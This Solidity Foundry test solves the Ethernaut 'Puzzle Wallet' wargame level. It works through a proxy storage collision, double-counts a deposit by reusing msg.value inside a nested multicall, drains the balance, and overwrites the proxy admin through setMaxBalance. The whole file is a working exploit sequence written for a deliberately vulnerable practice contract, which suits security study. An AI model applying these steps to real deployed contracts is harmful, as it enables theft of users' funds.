// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

interface IPuzzleProxy {
    function proposeNewAdmin(address _newAdmin) external;
    function admin() external view returns (address);
}

interface IPuzzleWallet {
    function owner() external view returns (address);
    function maxBalance() external view returns (uint256);
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function multicall(bytes[] calldata data) external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function setMaxBalance(uint256 _maxBalance) external;
}

interface IEthernaut {
    function createLevelInstance(address _level) external payable;
    function submitLevelInstance(address _instance) external;
}

contract EthernautPuzzleTest is Test {
    IEthernaut ethernaut = IEthernaut(0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6);
    address levelFactory = 0x725595BA16E76ED1F6cC1e1b65A88365cC494824; 

    function testLevel24_PuzzleWallet() public {
        address hacker = makeAddr("hacker");

        vm.deal(hacker, 1 ether); 
        vm.startPrank(hacker);

        vm.recordLogs();

        ethernaut.createLevelInstance{value: 0.001 ether}(levelFactory);
        
        Vm.Log[] memory entries = vm.getRecordedLogs();
        bytes32 instanceTopic = entries[entries.length - 1].topics[2];
        address levelAddr = address(uint160(uint256(instanceTopic)));
        console.log("Puzzle Instance:", levelAddr);

        IPuzzleProxy proxy = IPuzzleProxy(levelAddr);
        IPuzzleWallet wallet = IPuzzleWallet(levelAddr);

        console.log("Current Owner:", wallet.owner());
        proxy.proposeNewAdmin(hacker);
        console.log("New Owner (Hacker):", wallet.owner());
        
        assertEq(wallet.owner(), hacker);

        wallet.addToWhitelist(hacker);

        bytes[] memory depositData = new bytes[](1);
        depositData[0] = abi.encodeWithSelector(wallet.deposit.selector);

        bytes[] memory data = new bytes[](2);

        data[0] = abi.encodeWithSelector(wallet.deposit.selector);

        data[1] = abi.encodeWithSelector(wallet.multicall.selector, depositData);


        wallet.multicall{value: 0.001 ether}(data);

        wallet.execute(hacker, 0.002 ether, "");

        console.log("Contract Balance:", levelAddr.balance);
        assertEq(levelAddr.balance, 0);

        uint256 hackerAsUint = uint256(uint160(hacker));
        
        wallet.setMaxBalance(hackerAsUint);

        console.log("New Admin:", proxy.admin());
        assertEq(proxy.admin(), hacker);

        ethernaut.submitLevelInstance(levelAddr);
        vm.stopPrank();
    }
}